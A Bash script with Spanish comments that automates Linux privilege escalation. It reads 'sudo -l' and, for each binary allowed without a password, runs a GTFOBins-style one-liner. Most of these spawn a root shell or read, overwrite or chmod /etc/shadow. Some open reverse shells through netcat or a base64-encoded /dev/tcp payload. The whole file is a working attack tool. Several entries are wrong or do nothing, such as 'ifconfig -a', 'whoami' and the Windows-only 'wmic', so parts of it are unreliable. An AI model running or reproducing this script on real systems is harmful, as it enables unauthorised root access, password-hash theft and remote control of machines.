#!/bin/bash

# Verificar si se puede ejecutar 'sudo -l'
if ! sudo -l &>/dev/null; then
    echo "No tienes permisos para ejecutar sudo -l. Salida."
    exit 1
fi

# Obtener la salida de sudo -l
sudo_list=$(sudo -l)

# Funciones de escalada para cada binario de GTFOBins
escalar_apache2() { sudo apache2 -f /etc/shadow -k start; }
escalar_apt() { sudo apt-get changelog apt; }
escalar_aptget() { sudo apt-get -o APT::Update::Pre-Invoke::=/bin/sh update; }
escalar_aria2c() { sudo aria2c --on-download-error=/bin/sh http://localhost/; }
escalar_ash() { sudo ash; }
escalar_awk() { sudo awk 'BEGIN {system("/bin/sh")}' ; }
escalar_base64() { echo 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxCg==' | base64 -d | bash; }
escalar_bash() { sudo bash; }
escalar_busybox() { sudo busybox sh; }
escalar_cat() { sudo cat /etc/shadow; }
escalar_chmod() { sudo chmod 777 /etc/shadow; }
escalar_chown() { sudo chown $(id -un) /etc/shadow; }
escalar_cp() { sudo cp /bin/sh /tmp/sh && sudo chmod +s /tmp/sh && /tmp/sh; }
escalar_curl() { sudo curl -o /etc/shadow http://localhost/shadow; }
escalar_cut() { sudo cut -d '' -f1 /etc/shadow; }
escalar_dash() { sudo dash; }
escalar_date() { sudo date -f /etc/shadow; }
escalar_dd() { sudo dd if=/etc/shadow of=/dev/null; }
escalar_diff() { sudo diff /etc/shadow /etc/shadow; }
escalar_dpkg() { sudo dpkg -l; }
escalar_docker() { sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh; }
escalar_echo() { sudo echo '/bin/sh' > /tmp/sh && sudo chmod +x /tmp/sh && /tmp/sh; }
escalar_ed() { sudo ed; }
escalar_env() { sudo env /bin/sh; }
escalar_expect() { sudo expect -c 'spawn /bin/sh;'; }
escalar_falconctl() { sudo falconctl -g -F '/bin/sh' -s; }
escalar_find() { sudo find . -exec /bin/sh \; -quit; }
escalar_flume() { sudo flume-agent --conf-file /etc/shadow; }
escalar_gawk() { sudo gawk 'BEGIN {system("/bin/sh")}'; }
escalar_gdb() { sudo gdb -nx -ex '!sh' -ex quit; }
escalar_git() { sudo git -p help config; }
escalar_grep() { sudo grep '' /etc/shadow; }
escalar_head() { sudo head -c1G /etc/shadow; }
escalar_ht() { sudo ht /etc/shadow; }
escalar_ifconfig() { sudo ifconfig -a; }
escalar_ip() { sudo ip a; }
escalar_ionice() { sudo ionice /bin/sh; }
escalar_jjs() { sudo jjs -scripting -e "var c = new java.lang.ProcessBuilder('/bin/sh').start(); c.waitFor();"; }
escalar_journalctl() { sudo journalctl -n10 -o json; }
escalar_kubectl() { sudo kubectl run -it --rm --image=busybox shell; }
escalar_ldconfig() { sudo ldconfig -n /etc; }
escalar_less() { sudo less /etc/shadow; }
escalar_lftp() { sudo lftp; }
escalar_ln() { sudo ln /bin/sh /tmp/sh && sudo chmod +s /tmp/sh && /tmp/sh; }
escalar_loginctl() { sudo loginctl -t service; }
escalar_logsave() { sudo logsave -rs /bin/sh /dev/null; }
escalar_lua() { sudo lua -e 'os.execute("/bin/sh")'; }
escalar_make() { sudo make -s eval='/bin/sh' -f- <<< 'x:'; }
escalar_man() { sudo man man; }
escalar_mico() { sudo mico server /etc/shadow; }
escalar_mkfifo() { sudo mkfifo /tmp/f; }
escalar_mktemp() { sudo mktemp; }
escalar_more() { sudo more /etc/shadow; }
escalar_mount() { sudo mount -t tmpfs none /tmp && chmod 777 /tmp && /tmp/sh; }
escalar_mv() { sudo mv /bin/sh /tmp/sh && sudo chmod +s /tmp/sh && /tmp/sh; }
escalar_mysql() { sudo mysql -e '! /bin/sh'; }
escalar_nc() { sudo nc -e /bin/sh 127.0.0.1 4444; }
escalar_netcat() { sudo netcat -e /bin/sh 127.0.0.1 4444; }
escalar_nmap() { sudo nmap --script='!sh' -iR 1; }
escalar_node() { sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: "inherit"});'; }
escalar_openvpn() { sudo openvpn --config /etc/shadow; }
escalar_php() { sudo php -r 'system("/bin/sh");'; }
escalar_procmail() { sudo procmail -m /etc/shadow; }
escalar_pulseaudio() { sudo pulseaudio --dump-conf; }
escalar_pureftpd() { sudo pure-ftpd /etc/shadow; }
escalar_read() { sudo readlink -f /etc/shadow; }
escalar_ruby() { sudo ruby -e 'exec "/bin/sh"'; }
escalar_scapy() { sudo scapy; }
escalar_scp() { sudo scp -S /bin/sh /etc/hosts localhost:/tmp; }
escalar_screen() { sudo screen /bin/sh; }
escalar_script() { sudo script /dev/null; }
escalar_see() { sudo see /etc/shadow; }
escalar_setarch() { sudo setarch $(uname -m) -R /bin/sh; }
escalar_setfacl() { sudo setfacl -m u::rwx /etc/shadow; }
escalar_sftp() { sudo sftp; }
escalar_sqlite3() { sudo sqlite3 /etc/shadow; }
escalar_ss() { sudo ss -a; }
escalar_ssh() { sudo ssh -o ProxyCommand='/bin/sh -i <&2 >&2' localhost; }
escalar_strace() { sudo strace -o/dev/null /bin/sh; }
escalar_systemctl() { sudo systemctl status ssh; }
escalar_tee() { sudo tee /etc/shadow; }
escalar_telnet() { sudo telnet; }
escalar_time() { sudo time /bin/sh; }
escalar_top() { sudo top -c; }
escalar_touch() { sudo touch /etc/shadow; }
escalar_tshark() { sudo tshark -o OUTPUT; }
escalar_unzip() { sudo unzip; }
escalar_vim() { sudo vim -c ':!/bin/sh'; }
escalar_watch() { sudo watch /bin/sh; }
escalar_wget() { sudo wget -O /etc/shadow http://localhost/shadow; }
escalar_whoami() { sudo whoami; }
escalar_wmic() { sudo wmic; }
escalar_xargs() { sudo xargs; }
escalar_zip() { sudo zip exploit.zip /etc/hosts -T -TT /bin/sh; }

# Ejecutar cada función si el binario está presente en sudo -l
for cmd in apache2 apt aptget aria2c ash awk base64 bash busybox cat chmod chown cp curl dash date dd diff dpkg docker echo ed env expect falconctl find flume gawk gdb git grep head ht ifconfig ip ionice jjs journalctl kubectl ldconfig less lftp ln logsave lua make man mico mkfifo mktemp more mount mv mysql nc netcat nmap node openvpn php procmail pulseaudio pureftpd read ruby scapy scp screen script see setarch setfacl sftp sqlite3 ss ssh strace systemctl tee telnet time top touch tshark unzip vim watch wget whoami wmic xargs zip; do
    if echo "$sudo_list" | grep -q "(ALL) NOPASSWD: /usr/bin/$cmd"; then
        escalar_$cmd
    fi
done
